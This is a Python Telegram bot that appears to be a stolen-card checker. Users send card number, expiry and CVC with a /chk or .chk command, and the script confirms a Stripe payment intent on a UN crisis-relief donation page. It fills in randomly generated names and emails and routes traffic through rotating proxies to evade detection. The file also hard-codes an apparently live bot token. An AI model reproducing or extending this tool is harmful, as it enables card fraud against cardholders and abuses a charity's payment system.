 import requests
import telebot
import random
import string
import names
import json
import os
from itertools import cycle

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
TELEGRAM_BOT_TOKEN = '6126045919:AAEo-9ddN2PvlzWtnWtyUbkxQCUpSyXLKVg'
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ProxyRotator class to handle proxy rotation
class ProxyRotator:
    def __init__(self, proxy_file):
        with open(proxy_file, 'r') as f:
            self.proxy_list = [line.strip() for line in f.readlines()]
        random.shuffle(self.proxy_list)
        self.proxy_cycle = cycle(self.proxy_list)
        self.working_proxies = set()
        self.failed_proxies = set()

    def is_proxy_live(self, proxy):
        try:
            response = requests.get('http://httpbin.org/ip', proxies=proxy, timeout=5)
            return response.status_code == 200
        except:
            return False

    def parse_proxy(self, proxy):
        parts = proxy.split('@')
        if len(parts) == 2:
            ip_port, auth = parts
            username, password = auth.split(':')
            return {
                'http': f'http://{username}:{password}@{ip_port}',
                'https': f'http://{username}:{password}@{ip_port}'
            }
        else:
            return {
                'http': 'http://' + proxy,
                'https': 'http://' + proxy
            }

    def get_proxy(self):
        for _ in range(len(self.proxy_list)):
            proxy = next(self.proxy_cycle)
            if proxy in self.working_proxies:
                return self.parse_proxy(proxy)
            if proxy not in self.failed_proxies:
                proxy_dict = self.parse_proxy(proxy)
                if self.is_proxy_live(proxy_dict):
                    self.working_proxies.add(proxy)
                    return proxy_dict
                else:
                    self.failed_proxies.add(proxy)
        if self.working_proxies:
            return self.parse_proxy(random.choice(list(self.working_proxies)))
        else:
            raise Exception("No live proxy found")

proxy_rotator = ProxyRotator('proxies.txt')

# Function to fetch random user details
def get_random_user():
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    email_providers = [
        "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
        "icloud.com", "protonmail.com", "aol.com", "mail.com"
    ]
    email_domain = random.choice(email_providers)
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 9999)}@{email_domain}"
    return first_name, last_name, email

# Function to generate a random string
def generate_random_string(pattern):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in pattern)

# Function to call a C++ executable and get the result
def call_cpp_executable(command):
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout.strip()

# Function to check payment status using Stripe API with cURL credentials
def check_payment(card_number, month, year, cvc):
    url = "https://api.stripe.com/v1/payment_intents/pi_3QWWtdIE1ijOzIgP0JOnGvJj/confirm"
    headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    }
    first_name, last_name, email = get_random_user()
    data = {
        "return_url": "https://crisisrelief.un.org/donate",
        "payment_method_data[billing_details][name]": f"{first_name} {last_name}",
        "payment_method_data[billing_details][email]": email,
        "payment_method_data[card][number]": card_number,
        "payment_method_data[card][exp_month]": month,
        "payment_method_data[card][exp_year]": year,
        "payment_method_data[card][cvc]": cvc
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

# Command handler for /chk and .chk
@bot.message_handler(commands=['chk'])
def chk(message):
    card_details = message.text.split()[1].split('|')
    if len(card_details) == 4:
        card_number, month, year, cvc = card_details
        payment_response = check_payment(card_number, month, year, cvc)
        bot.reply_to(message, f"Payment Response: {payment_response}")
    else:
        bot.reply_to(message, "Please provide card details in the format: /chk card_number|month|year|cvc")

@bot.message_handler(func=lambda message: message.text.startswith('.chk'))
def chk_dot(message):
    card_details = message.text.split()[1].split('|')
    if len(card_details) == 4:
        card_number, month, year, cvc = card_details
        payment_response = check_payment(card_number, month, year, cvc)
        bot.reply_to(message, f"Payment Response: {payment_response}")
    else:
        bot.reply_to(message, "Please provide card details in the format: .chk card_number|month|year|cvc")

# Start the bot
bot.polling()
